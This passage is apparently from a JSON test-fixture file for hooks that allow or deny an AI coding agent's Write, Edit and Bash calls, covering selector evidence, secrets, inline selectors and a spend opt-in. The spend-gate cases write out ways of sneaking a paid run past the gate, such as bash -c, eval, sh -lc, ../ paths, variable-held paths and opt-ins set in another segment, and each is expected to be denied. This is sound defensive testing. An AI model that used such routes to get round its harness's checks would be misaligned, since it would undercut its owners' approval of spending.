   "factory-gates.md#specs.shape"
  ],
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json",
   "docs/scenarios.md",
   {
    "scripts/scenario-lint.mjs": "scripts/scenario-lint-stub.mjs"
   }
  ]
 },
 {
  "name": "intake-gate.deny-unknown-id",
  "hook": "intake-gate",
  "ruleId": "specs.shape",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/south/zz-intake.spec.ts",
    "content": "test(\"CHK-99 \u2014 made-up scenario\", async () => {});\n"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[specs.shape]",
   "(CHK-99 \u2014 made-up scenario \u2014 no scenario block headed CHK-99 in docs/scenarios.md)",
   "factory-gates.md#specs.shape"
  ]
 },
 {
  "name": "repository-evidence-gate.allow-default-evidence-dir",
  "hook": "repository-evidence-gate",
  "ruleId": "selectors.evidence",
  "input": {
   "tool_name": "Edit",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/page-repository.json",
    "old_string": "\"elementName\": \"regionSearchButton\",",
    "new_string": "\"elementName\": \"zzDefault\",\n          \"selector\": { \"css\": \"[data-testid='zz-default']\" }\n        },\n        {\n          \"elementName\": \"regionSearchButton\","
   }
  },
  "expect": "allow",
  "cwd": "temp",
  "write": {
   "achilles-factory-rules.json": "{\"version\": 1, \"rules\": {\"selectors.evidence\": {\"description\": \"Every new or changed page-repository selector has a live evidence note, or is marked provisional.\", \"doc\": \"skills/achilles-protocol/references/factory-gates.md#selectors.evidence\", \"repository\": \"tests/e2e/page-repository.json\", \"action\": \"Run npx achilles-selector-evidence for <Page>.<element>, or insert the entry with \\\"provisional\\\": true.\"}}}\n",
   "tests/e2e/page-repository.json": "{\n  \"pages\": [\n    {\n      \"name\": \"HomePage\",\n      \"elements\": [\n        {\n          \"elementName\": \"regionSearchButton\",\n          \"selector\": {\n            \"css\": \"[data-testid='region-search-button']\"\n          }\n        }\n      ]\n    }\n  ]\n}\n",
   "docs/evidence/selectors/HomePage.zzDefault.md": "# HomePage.zzDefault\n- selector: {\"css\":\"[data-testid='zz-default']\"}\n- source: live (fixture)\n"
  },
  "warn": false,
  "_comment": "evidenceDir is schema-OPTIONAL, so its default decides where a project that omits it must put notes \u2014 and the gate and achilles-selector-evidence used to disagree about it (docs/evidence/selectors vs tests/e2e/docs/evidence/selectors), which is a deny the agent cannot clear by running the tool the deny names. This pins the gate to the schema's declared default."
 },
 {
  "name": "repository-evidence-gate.allow-note-key-order",
  "hook": "repository-evidence-gate",
  "ruleId": "selectors.evidence",
  "input": {
   "tool_name": "Edit",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/page-repository.json",
    "old_string": "\"elementName\": \"regionSuggestion\",",
    "new_string": "\"elementName\": \"zzNoted\",\n          \"selector\": { \"css\": \"[data-testid='zz-noted']\", \"text\": \"Go\" }\n        },\n        {\n          \"elementName\": \"regionSuggestion\","
   }
  },
  "expect": "allow",
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "write": {
   "tests/e2e/page-repository.json": "{\n  \"pages\": [\n    {\n      \"name\": \"HomePage\",\n      \"elements\": [\n        {\n          \"elementName\": \"regionSearchButton\",\n          \"selector\": { \"css\": \"[data-testid='region-search-button']\" }\n        },\n        {\n          \"elementName\": \"regionSuggestion\",\n          \"selector\": { \"css\": \"[data-testid='region-suggestion']\" }\n        }\n      ]\n    }\n  ]\n}\n",
   "docs/evidence/selectors/HomePage.zzNoted.md": "# HomePage.zzNoted\n- selector: {\"text\":\"Go\",\"css\":\"[data-testid='zz-noted']\"}\n- source: live (fixture)\n"
  },
  "warn": false,
  "_comment": "Deep-equal: key order in the note selector line is irrelevant."
 },
 {
  "name": "repository-evidence-gate.allow-other-file",
  "hook": "repository-evidence-gate",
  "ruleId": "selectors.evidence",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/data/zz-other.json",
    "content": "{ \"pages\": [ { \"name\": \"HomePage\", \"elements\": [ { \"elementName\": \"zzFake\", \"selector\": { \"css\": \"x\" } } ] } ] }\n"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "repository-evidence-gate.allow-provisional-flag-only",
  "hook": "repository-evidence-gate",
  "ruleId": "selectors.evidence",
  "input": {
   "tool_name": "Edit",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/page-repository.json",
    "old_string": "\"elementName\": \"regionSuggestion\",",
    "new_string": "\"elementName\": \"regionSuggestion\",\n          \"provisional\": true,"
   }
  },
  "expect": "allow",
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "write": {
   "tests/e2e/page-repository.json": "{\n  \"pages\": [\n    {\n      \"name\": \"HomePage\",\n      \"elements\": [\n        {\n          \"elementName\": \"regionSearchButton\",\n          \"selector\": { \"css\": \"[data-testid='region-search-button']\" }\n        },\n        {\n          \"elementName\": \"regionSuggestion\",\n          \"selector\": { \"css\": \"[data-testid='region-suggestion']\" }\n        }\n      ]\n    }\n  ]\n}\n"
  },
  "warn": false
 },
 {
  "name": "repository-evidence-gate.allow-unparsable-result",
  "hook": "repository-evidence-gate",
  "ruleId": "selectors.evidence",
  "input": {
   "tool_name": "Edit",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/page-repository.json",
    "old_string": "\"elementName\": \"regionSuggestion\",",
    "new_string": "\"elementName\": \"zzBroken\" \"selector\": {"
   }
  },
  "expect": "allow",
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "write": {
   "tests/e2e/page-repository.json": "{\n  \"pages\": [\n    {\n      \"name\": \"HomePage\",\n      \"elements\": [\n        {\n          \"elementName\": \"regionSearchButton\",\n          \"selector\": { \"css\": \"[data-testid='region-search-button']\" }\n        },\n        {\n          \"elementName\": \"regionSuggestion\",\n          \"selector\": { \"css\": \"[data-testid='region-suggestion']\" }\n        }\n      ]\n    }\n  ]\n}\n"
  }
 },
 {
  "name": "repository-evidence-gate.allow-with-note",
  "hook": "repository-evidence-gate",
  "ruleId": "selectors.evidence",
  "input": {
   "tool_name": "Edit",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/page-repository.json",
    "old_string": "\"elementName\": \"regionSuggestion\",",
    "new_string": "\"elementName\": \"zzNoted\",\n          \"selector\": { \"css\": \"[data-testid='zz-noted']\" }\n        },\n        {\n          \"elementName\": \"regionSuggestion\","
   }
  },
  "expect": "allow",
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "write": {
   "tests/e2e/page-repository.json": "{\n  \"pages\": [\n    {\n      \"name\": \"HomePage\",\n      \"elements\": [\n        {\n          \"elementName\": \"regionSearchButton\",\n          \"selector\": { \"css\": \"[data-testid='region-search-button']\" }\n        },\n        {\n          \"elementName\": \"regionSuggestion\",\n          \"selector\": { \"css\": \"[data-testid='region-suggestion']\" }\n        }\n      ]\n    }\n  ]\n}\n",
   "docs/evidence/selectors/HomePage.zzNoted.md": "# HomePage.zzNoted\n- selector: {\"css\":\"[data-testid='zz-noted']\"}\n- source: live (fixture)\n"
  },
  "warn": false,
  "_comment": "The note selector line equals the new entry selector (deep-equal) and it has a source line."
 },
 {
  "name": "repository-evidence-gate.deny-missing-note",
  "hook": "repository-evidence-gate",
  "ruleId": "selectors.evidence",
  "input": {
   "tool_name": "Edit",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/page-repository.json",
    "old_string": "\"elementName\": \"regionSuggestion\",",
    "new_string": "\"elementName\": \"zzFakeElement\",\n          \"selector\": { \"css\": \"[data-testid='zz-fake']\" }\n        },\n        {\n          \"elementName\": \"regionSuggestion\","
   }
  },
  "expect": "deny",
  "messageContains": [
   "[selectors.evidence]",
   "Repository entry HomePage.zzFakeElement has no evidence note.",
   "--page HomePage --element zzFakeElement",
   "factory-gates.md#selectors.evidence",
   "Insert the entry with \"provisional\": true",
   "then drop the flag in the same change",
   "known-issues row"
  ],
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "write": {
   "tests/e2e/page-repository.json": "{\n  \"pages\": [\n    {\n      \"name\": \"HomePage\",\n      \"elements\": [\n        {\n          \"elementName\": \"regionSearchButton\",\n          \"selector\": { \"css\": \"[data-testid='region-search-button']\" }\n        },\n        {\n          \"elementName\": \"regionSuggestion\",\n          \"selector\": { \"css\": \"[data-testid='region-suggestion']\" }\n        }\n      ]\n    }\n  ]\n}\n"
  }
 },
 {
  "name": "repository-evidence-gate.deny-note-under-wrong-default",
  "hook": "repository-evidence-gate",
  "ruleId": "selectors.evidence",
  "input": {
   "tool_name": "Edit",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/page-repository.json",
    "old_string": "\"elementName\": \"regionSearchButton\",",
    "new_string": "\"elementName\": \"zzDefault\",\n          \"selector\": { \"css\": \"[data-testid='zz-default']\" }\n        },\n        {\n          \"elementName\": \"regionSearchButton\","
   }
  },
  "expect": "deny",
  "messageContains": [
   "[selectors.evidence]",
   "HomePage.zzDefault",
   "factory-gates.md#selectors.evidence"
  ],
  "cwd": "temp",
  "write": {
   "achilles-factory-rules.json": "{\"version\": 1, \"rules\": {\"selectors.evidence\": {\"description\": \"Every new or changed page-repository selector has a live evidence note, or is marked provisional.\", \"doc\": \"skills/achilles-protocol/references/factory-gates.md#selectors.evidence\", \"repository\": \"tests/e2e/page-repository.json\", \"action\": \"Run npx achilles-selector-evidence for <Page>.<element>, or insert the entry with \\\"provisional\\\": true.\"}}}\n",
   "tests/e2e/page-repository.json": "{\n  \"pages\": [\n    {\n      \"name\": \"HomePage\",\n      \"elements\": [\n        {\n          \"elementName\": \"regionSearchButton\",\n          \"selector\": {\n            \"css\": \"[data-testid='region-search-button']\"\n          }\n        }\n      ]\n    }\n  ]\n}\n",
   "tests/e2e/docs/evidence/selectors/HomePage.zzDefault.md": "# HomePage.zzDefault\n- selector: {\"css\":\"[data-testid='zz-default']\"}\n- source: live (fixture)\n"
  },
  "_comment": "The other side of the same pin: a note under the path the tool USED to default to is not evidence. If this case ever passes as an allow, the gate has grown a second accepted default and the two can drift apart again."
 },
 {
  "name": "repository-evidence-gate.deny-note-without-source",
  "hook": "repository-evidence-gate",
  "ruleId": "selectors.evidence",
  "input": {
   "tool_name": "Edit",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/page-repository.json",
    "old_string": "\"elementName\": \"regionSuggestion\",",
    "new_string": "\"elementName\": \"zzNoted\",\n          \"selector\": { \"css\": \"[data-testid='zz-noted']\" }\n        },\n        {\n          \"elementName\": \"regionSuggestion\","
   }
  },
  "expect": "deny",
  "messageContains": [
   "[selectors.evidence]",
   "has no \"- source:\" line"
  ],
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "write": {
   "tests/e2e/page-repository.json": "{\n  \"pages\": [\n    {\n      \"name\": \"HomePage\",\n      \"elements\": [\n        {\n          \"elementName\": \"regionSearchButton\",\n          \"selector\": { \"css\": \"[data-testid='region-search-button']\" }\n        },\n        {\n          \"elementName\": \"regionSuggestion\",\n          \"selector\": { \"css\": \"[data-testid='region-suggestion']\" }\n        }\n      ]\n    }\n  ]\n}\n",
   "docs/evidence/selectors/HomePage.zzNoted.md": "# HomePage.zzNoted\n- selector: {\"css\":\"[data-testid='zz-noted']\"}\n"
  },
  "_comment": "A hand-written note without the evidence tool source line."
 },
 {
  "name": "repository-evidence-gate.deny-schema-unreadable",
  "hook": "repository-evidence-gate",
  "ruleId": "selectors.evidence",
  "input": {
   "tool_name": "Edit",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/page-repository.json",
    "old_string": "\"elementName\": \"regionSearchButton\",",
    "new_string": "\"elementName\": \"zzDefault\",\n          \"selector\": { \"css\": \"[data-testid='zz-default']\" }\n        },\n        {\n          \"elementName\": \"regionSearchButton\","
   }
  },
  "expect": "deny",
  "messageContains": [
   "[selectors.evidence]",
   "unreadable",
   "Reinstall @civitas-cerebrum/achilles"
  ],
  "cwd": "temp",
  "write": {
   "achilles-factory-rules.json": "{\"version\": 1, \"rules\": {\"selectors.evidence\": {\"description\": \"Every new or changed page-repository selector has a live evidence note, or is marked provisional.\", \"doc\": \"skills/achilles-protocol/references/factory-gates.md#selectors.evidence\", \"repository\": \"tests/e2e/page-repository.json\", \"action\": \"Run npx achilles-selector-evidence for <Page>.<element>, or insert the entry with \\\"provisional\\\": true.\"}}}\n",
   "tests/e2e/page-repository.json": "{\n  \"pages\": [\n    {\n      \"name\": \"HomePage\",\n      \"elements\": [\n        {\n          \"elementName\": \"regionSearchButton\",\n          \"selector\": {\n            \"css\": \"[data-testid='region-search-button']\"\n          }\n        }\n      ]\n    }\n  ]\n}\n"
  },
  "_comment": "The evidenceDir default is read from the shipped schema; an unreadable schema is a broken install and the gate denies rather than guess a directory."
 },
 {
  "name": "repository-evidence-gate.deny-stale-note",
  "hook": "repository-evidence-gate",
  "ruleId": "selectors.evidence",
  "input": {
   "tool_name": "Edit",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/page-repository.json",
    "old_string": "\"css\": \"[data-testid='region-suggestion']\"",
    "new_string": "\"css\": \"[data-testid='region-suggestion-v2']\""
   }
  },
  "expect": "deny",
  "messageContains": [
   "[selectors.evidence]",
   "HomePage.regionSuggestion.md is stale",
   "\"provisional\": true",
   "--page HomePage --element regionSuggestion"
  ],
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "write": {
   "tests/e2e/page-repository.json": "{\n  \"pages\": [\n    {\n      \"name\": \"HomePage\",\n      \"elements\": [\n        {\n          \"elementName\": \"regionSearchButton\",\n          \"selector\": { \"css\": \"[data-testid='region-search-button']\" }\n        },\n        {\n          \"elementName\": \"regionSuggestion\",\n          \"selector\": { \"css\": \"[data-testid='region-suggestion']\" }\n        }\n      ]\n    }\n  ]\n}\n",
   "docs/evidence/selectors/HomePage.regionSuggestion.md": "# HomePage.regionSuggestion\n- selector: {\"css\":\"[data-testid='region-suggestion']\"}\n- source: live (fixture)\n"
  },
  "_comment": "The note still describes the old selector: stale."
 },
 {
  "name": "repository-evidence-gate.deny-write-changed-selector",
  "hook": "repository-evidence-gate",
  "ruleId": "selectors.evidence",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/page-repository.json",
    "content": "{ \"pages\": [ { \"name\": \"HomePage\", \"elements\": [ { \"elementName\": \"regionSuggestion\", \"selector\": { \"css\": \"[data-testid='zz-changed']\" } } ] } ] }\n"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[selectors.evidence]",
   "Repository entry HomePage.regionSuggestion has no evidence note."
  ],
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ],
  "write": {
   "tests/e2e/page-repository.json": "{\n  \"pages\": [\n    {\n      \"name\": \"HomePage\",\n      \"elements\": [\n        {\n          \"elementName\": \"regionSearchButton\",\n          \"selector\": { \"css\": \"[data-testid='region-search-button']\" }\n        },\n        {\n          \"elementName\": \"regionSuggestion\",\n          \"selector\": { \"css\": \"[data-testid='region-suggestion']\" }\n        }\n      ]\n    }\n  ]\n}\n"
  }
 },
 {
  "name": "secrets-gate.allow-allowlisted-literal",
  "hook": "secrets-gate",
  "ruleId": "secrets.none",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/unit/zz-case.spec.ts",
    "content": "const e = 'someone@example.test';\n"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "secrets-gate.allow-env-name",
  "hook": "secrets-gate",
  "ruleId": "secrets.none",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/data/zz-case.ts",
    "content": "const email = process.env.SHOPPER_A_EMAIL; // placeholder <SHOPPER_A_EMAIL>\n"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "secrets-gate.allow-prefix-path",
  "hook": "secrets-gate",
  "ruleId": "secrets.none",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/unit/fixtures/zz-case.ts",
    "content": "const e = 'shopper.a@shop.invalid';\n"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "secrets-gate.deny-claude-md",
  "hook": "secrets-gate",
  "ruleId": "secrets.none",
  "input": {
   "tool_name": "Edit",
   "tool_input": {
    "file_path": "{{ROOT}}/CLAUDE.md",
    "old_string": "x",
    "new_string": "mail shopper.a@shop.invalid"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[secrets.none]",
   "Edit of CLAUDE.md"
  ],
  "_comment": "A single-file scope entry; Edit wording."
 },
 {
  "name": "secrets-gate.deny-email",
  "hook": "secrets-gate",
  "ruleId": "secrets.none",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/data/zz-case.json",
    "content": "{ \"user\": \"shopper.a@shop.invalid\" }\n"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[secrets.none]",
   "factory-gates.md#secrets.none"
  ]
 },
 {
  "name": "secrets-gate.deny-phone",
  "hook": "secrets-gate",
  "ruleId": "secrets.none",
  "input": {
   "tool_name": "Edit",
   "tool_input": {
    "file_path": "{{ROOT}}/docs/zz-case.md",
    "old_string": "a",
    "new_string": "call +155501002345"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[secrets.none]",
   "factory-gates.md#secrets.none"
  ]
 },
 {
  "name": "secrets-gate.deny-project-skill",
  "hook": "secrets-gate",
  "ruleId": "secrets.none",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/.claude/skills/project-checkout/zz-case.md",
    "content": "mail shopper.a@shop.invalid\n"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[secrets.none]"
  ],
  "_comment": ".claude/skills/project-*/** is in scope."
 },
 {
  "name": "secrets-gate.deny-scripts-in-scope",
  "hook": "secrets-gate",
  "ruleId": "secrets.none",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/scripts/zz-case.mjs",
    "content": "const e = 'shopper.a@shop.invalid';\n"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[secrets.none]",
   "Write to scripts/zz-case.mjs"
  ]
 },
 {
  "name": "secrets-gate.ignore-out-of-scope",
  "hook": "secrets-gate",
  "ruleId": "secrets.none",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/.claude/skills/zz-vendor-skill/SKILL.md",
    "content": "e.g. shopper.a@shop.invalid\n"
   }
  },
  "expect": "allow",
  "warn": false,
  "_comment": "Vendored (non-project) skills are outside the scope."
 },
 {
  "name": "selector-write-gate.allow-comment",
  "hook": "selector-write-gate",
  "ruleId": "selectors.no-inline",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/north/zz-case.spec.ts",
    "content": "// never page.locator(x) here\n/* nor getByRole( */ await steps.click('payButton', 'PaymentPage');\n"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "selector-write-gate.allow-extract-attribute",
  "hook": "selector-write-gate",
  "ruleId": "selectors.no-inline",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/support/zz-case.ts",
    "content": "const v = await steps.getAttribute('payButton', 'PaymentPage', { extractAttribute: 'href' });\nconst ctx = page.context();\n"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "selector-write-gate.allow-repo-name",
  "hook": "selector-write-gate",
  "ruleId": "selectors.no-inline",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/north/zz-case.spec.ts",
    "content": "await steps.click('payButton', 'PaymentPage');\n"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "selector-write-gate.allow-rules-missing",
  "hook": "selector-write-gate",
  "ruleId": "selectors.no-inline",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/north/zz-case.spec.ts",
    "content": "await page.locator(x);\n"
   }
  },
  "expect": "allow",
  "cwd": "temp",
  "warn": false
 },
 {
  "name": "selector-write-gate.deny-edit-getbyrole",
  "hook": "selector-write-gate",
  "ruleId": "selectors.no-inline",
  "input": {
   "tool_name": "Edit",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/fixtures/zz-case.ts",
    "old_string": "a",
    "new_string": "await page.getByRole('button').click();"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[selectors.no-inline]",
   "factory-gates.md#selectors.no-inline",
   "Edit of tests/fixtures/zz-case.ts"
  ]
 },
 {
  "name": "selector-write-gate.deny-locator",
  "hook": "selector-write-gate",
  "ruleId": "selectors.no-inline",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/north/zz-case.spec.ts",
    "content": "await page.locator('[data-testid=\"pay\"]').click();\n"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[selectors.no-inline]",
   "factory-gates.md#selectors.no-inline",
   "Write to tests/e2e/north/zz-case.spec.ts"
  ]
 },
 {
  "name": "selector-write-gate.deny-mts-locator",
  "hook": "selector-write-gate",
  "ruleId": "selectors.no-inline",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/north/zz-case.mts",
    "content": "await page.locator(\"x\").click();\n"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[selectors.no-inline]",
   "Write to tests/e2e/north/zz-case.mts"
  ],
  "_comment": ".mts/.cts/.js/.mjs/.cjs under the scope are judged like .ts."
 },
 {
  "name": "selector-write-gate.ignore-md",
  "hook": "selector-write-gate",
  "ruleId": "selectors.no-inline",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/tests/e2e/docs/zz-case.md",
    "content": "Never write page.locator(x) or getByRole( in a spec.\n"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "selector-write-gate.ignore-out-of-scope",
  "hook": "selector-write-gate",
  "ruleId": "selectors.no-inline",
  "input": {
   "tool_name": "Write",
   "tool_input": {
    "file_path": "{{ROOT}}/scripts/zz-case.ts",
    "content": "await page.locator(sel).first();\n"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "spend-gate.allow-bash-c-north",
  "hook": "spend-gate",
  "ruleId": "spend.opt-in",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "bash -c 'npx playwright test tests/e2e/north/north-card.spec.ts --project=north'"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "spend-gate.allow-bash-c-south-with-env",
  "hook": "spend-gate",
  "ruleId": "spend.opt-in",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "SPEND_OPT_IN=1 bash -c 'npx playwright test tests/e2e/south/checkout-order.spec.ts --project=south'"
   }
  },
  "expect": "allow",
  "warn": false,
  "_comment": "The outer assignment is inherited by the nested command (as the shell does)."
 },
 {
  "name": "spend-gate.allow-list-missing-warns",
  "hook": "spend-gate",
  "ruleId": "spend.opt-in",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "npx playwright test tests/e2e/south/checkout-order.spec.ts"
   }
  },
  "expect": "allow",
  "cwd": "temp",
  "copy": [
   "achilles-factory-rules.json"
  ]
 },
 {
  "name": "spend-gate.allow-north-card",
  "hook": "spend-gate",
  "ruleId": "spend.opt-in",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "npx playwright test tests/e2e/north/north-card.spec.ts --project=north"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "spend-gate.allow-north-grep-mentioning-spend",
  "hook": "spend-gate",
  "ruleId": "spend.opt-in",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "npx playwright test tests/e2e/north/north-card.spec.ts --project=north --grep \"not the checkout-order or wallet-order flow\""
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "spend-gate.allow-south-unlisted-spec",
  "hook": "spend-gate",
  "ruleId": "spend.opt-in",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "npx playwright test tests/e2e/south/checkout-state.spec.ts --project=south"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "spend-gate.allow-south-wallet-with-env",
  "hook": "spend-gate",
  "ruleId": "spend.opt-in",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "SPEND_OPT_IN=1 npx playwright test tests/e2e/south/wallet-order.spec.ts --project=south"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "spend-gate.allow-wrapper-default",
  "hook": "spend-gate",
  "ruleId": "spend.opt-in",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "node scripts/run-suite.mjs --continue --grep @smoke"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "spend-gate.allow-wrapper-with-flag",
  "hook": "spend-gate",
  "ruleId": "spend.opt-in",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "node scripts/run-suite.mjs --include-spend --grep CHK-06"
   }
  },
  "expect": "allow",
  "warn": false
 },
 {
  "name": "spend-gate.deny-bare-playwright-test",
  "hook": "spend-gate",
  "ruleId": "spend.opt-in",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "npx playwright test --workers 1"
   }
  },
  "expect": "deny",
  "messageContains": [
   "no --project and no file argument"
  ]
 },
 {
  "name": "spend-gate.deny-bash-c-checkout-order",
  "hook": "spend-gate",
  "ruleId": "spend.opt-in",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "bash -c \"npx playwright test tests/e2e/south/checkout-order.spec.ts --project=south\""
   }
  },
  "expect": "deny",
  "messageContains": [
   "[spend.opt-in]",
   "checkout-order.spec.ts"
  ],
  "_comment": "A bash -c payload is classified as a command of its own."
 },
 {
  "name": "spend-gate.deny-checkout-order-dotdot",
  "hook": "spend-gate",
  "ruleId": "spend.opt-in",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "npx   playwright   test tests/e2e/north/../south/checkout-order.spec.ts"
   }
  },
  "expect": "deny",
  "messageContains": [
   "checkout-order.spec.ts"
  ]
 },
 {
  "name": "spend-gate.deny-checkout-order-list",
  "hook": "spend-gate",
  "ruleId": "spend.opt-in",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "cd /tmp && npx playwright test checkout-order --list"
   }
  },
  "expect": "deny",
  "messageContains": [
   "checkout-order.spec.ts"
  ]
 },
 {
  "name": "spend-gate.deny-checkout-order-with-line",
  "hook": "spend-gate",
  "ruleId": "spend.opt-in",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "npx playwright test tests/e2e/south/checkout-order.spec.ts:42:7 --project=south"
   }
  },
  "expect": "deny",
  "messageContains": [
   "checkout-order.spec.ts"
  ]
 },
 {
  "name": "spend-gate.deny-eval-checkout-order",
  "hook": "spend-gate",
  "ruleId": "spend.opt-in",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "eval 'npx playwright test checkout-order --project=south'"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[spend.opt-in]",
   "checkout-order.spec.ts"
  ],
  "_comment": "An eval payload is classified as a command of its own."
 },
 {
  "name": "spend-gate.deny-opt-in-in-other-segment",
  "hook": "spend-gate",
  "ruleId": "spend.opt-in",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "export SPEND_OPT_IN=1; node scripts/run-suite.mjs --dry-run --include-spend && npx playwright test tests/e2e/south/wallet-order.spec.ts --project=south"
   }
  },
  "expect": "deny",
  "messageContains": [
   "wallet-order.spec.ts",
   "without SPEND_OPT_IN=1"
  ]
 },
 {
  "name": "spend-gate.deny-project-south-grep-multiword",
  "hook": "spend-gate",
  "ruleId": "spend.opt-in",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "npx playwright test --project=south -g \"CHK-06 \u2014 Card, registered shopper\""
   }
  },
  "expect": "deny",
  "messageContains": [
   "`playwright test --project=south` with no file argument"
  ]
 },
 {
  "name": "spend-gate.deny-project-south-no-filter",
  "hook": "spend-gate",
  "ruleId": "spend.opt-in",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "npx playwright test --project=south-auth --project south --grep @smoke"
   }
  },
  "expect": "deny",
  "messageContains": [
   "--project=south",
   "no file argument"
  ]
 },
 {
  "name": "spend-gate.deny-sh-lc-checkout-order",
  "hook": "spend-gate",
  "ruleId": "spend.opt-in",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "sh -lc 'cd tests && npx playwright test e2e/south/checkout-order.spec.ts'"
   }
  },
  "expect": "deny",
  "messageContains": [
   "checkout-order.spec.ts"
  ]
 },
 {
  "name": "spend-gate.deny-south-wallet-no-opt-in",
  "hook": "spend-gate",
  "ruleId": "spend.opt-in",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "npx playwright test tests/e2e/south/wallet-order.spec.ts --project=south"
   }
  },
  "expect": "deny",
  "messageContains": [
   "[spend.opt-in]",
   "wallet-order.spec.ts",
   "\u2192 Do: Prefix the command with SPEND_OPT_IN=1 for an owner-approved run (one per scenario), or use node scripts/run-suite.mjs",
   "factory-gates.md#spend.opt-in"
  ]
 },
 {
  "name": "spend-gate.deny-variable-spec",
  "hook": "spend-gate",
  "ruleId": "spend.opt-in",
  "input": {
   "tool_name": "Bash",
   "tool_input": {
    "command": "SPEC=tests/e2e/south/checkout-order.spec.ts; npx playwright test \"$SPEC\" --project=south"
   }
  },
  "expect": "deny",
  "messageContains": [
   "$SPEC",
   "use a literal path"
  ],
  "_comment": "A spec argument held in a variable cannot be judged: deny, asking for a literal path."
 },
 {
  "name": "spend-gate.deny-wrapper-names-spec",
  "hook": "spend-gate",
